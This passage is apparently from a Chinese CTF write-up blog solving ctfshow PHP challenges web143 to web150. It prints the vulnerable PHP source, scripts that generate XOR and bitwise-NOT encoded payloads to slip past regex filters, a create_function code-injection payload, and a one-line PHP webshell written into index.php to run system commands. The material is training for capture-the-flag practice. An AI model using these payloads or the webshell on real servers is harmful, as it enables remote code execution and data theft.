<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在web141的基础上多ban掉一些字符，ban了取反，但没ban异或需要的<code>^</code>，所以还是可以用web141的脚本，不过需要改一下规则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web143/%2575A4LJ6O_8TTQ_H%60RJU%25PI.png" alt=""><br>
记住，v3这里需要前后加上符号拜托掉return，最终payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*</span><br></pre></td></tr></table></figure>
<h3 id="web144"><a class="header-anchor" href="#web144">¶</a>web144</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v2))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen($str)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>和web141一样，这是参数需要改一下，因为这里有个check函数对v3做检测，我们把payload改到v2即可，运行web141的脚本就行<br>
payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web145"><a class="header-anchor" href="#web145">¶</a>web145</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在前面基础上ban了异或，但放行了<code>~</code>取反运算符，但之前v3需要<code>* ; + - </code>等等符号来拜托return，但都被ban了，测试了一下发现<code>|</code>可以使用<br>
取反脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>运行后构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</span><br></pre></td></tr></table></figure>
<h3 id="web146"><a class="header-anchor" href="#web146">¶</a>web146</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>没看出和上一题有什么差别(可能多ban了一些字符)，直接用上一题payload即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</span><br></pre></td></tr></table></figure>
<h3 id="web147"><a class="header-anchor" href="#web147">¶</a>web147</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    $ctfshow = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(<span class="string">&#x27;&#x27;</span>,$_GET[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>换了题型，这里对ctf进行了一个正则表达式过滤，post传参的<code>ctf</code>和get传参的<code>show</code>进行了组合，这里我们可以使用<code>create_function()</code>代码注入</p>
<blockquote>
<p>string create_function   ( string args  , string args , string code  )</p>
<p>string $args 变量部分<br>
string $code 方法代码部分</p>
</blockquote>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$dotast&#x27;</span>,<span class="string">&#x27;echo $dotast.&quot;very cool&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">$dotast</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $dotast.<span class="string">&quot;very cool&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*利用如下</span></span><br><span class="line"><span class="comment">如果我们第二个参数输入的是&#x27;echo 111;&#125;phpinfo();//&#x27;</span></span><br><span class="line"><span class="comment">即可把前面的方法括号给闭合并且成功执行phpinfo命令，后面用//注释掉后边的语句</span></span><br><span class="line"><span class="comment">也就是下面这个结构</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">$dotast</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
<p>而正则表达式我们可以用<code>\</code>进行绕过，正好<code>\</code>在php里代表默认命名空间</p>
<blockquote>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web147/E_13H4%40%7D%29_U8D%5D8BFQQ0%5B_S.png" alt=""><br>
最终payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?show&#x3D;echo 123;&#125;system(&quot;tac flag.php&quot;);&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">ctf&#x3D;\create_function</span><br></pre></td></tr></table></figure>
<h3 id="web148"><a class="header-anchor" href="#web148">¶</a>web148</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>没ban掉异或字符<code>^</code>，之前用前面的脚本跑就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web148/2S12%252MNYT%241_OV9M%29%5DU_97.png" alt=""><br>
运行后得到payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web149"><a class="header-anchor" href="#web149">¶</a>web149</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;ctf&#x27;</span>], $_POST[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里用file_put_contents函数写入文件，并且会有两个for循环判断不是index.php的文件会被删除，所以我们直接把一句话木马写进index.php就可以，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ctf&#x3D;index.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">show&#x3D;&lt;?php @eval($_POST[dotast]);?&gt;</span><br></pre></td></tr></table></figure>
<p>接着再index.php里利用我们的马即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url+index.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">dotast&#x3D;system(&quot;cat &#x2F;ctfshow_fl0g_here.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web150"><a class="header-anchor" href="#web150">¶</a>web150</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $vip;</span><br><span class="line">    <span class="keyword">private</span> $secret;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line">$key = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, $key))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($isVIP &amp;&amp; strrpos($ctf, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我用的日志包含绕过，应该也是非预期解，和前面写过的日志包含差不多，这里要想包含需要<code>$isvip</code>变量为true或者1，这里有<code>QUERY_STRING</code>和extract函数，所以我们可以直接通过get传参来定义(忘记这个知识点的往上看web127)，然后再<code>User-Agent</code>里写上一句话利用，这里写了脚本进行利用</p>
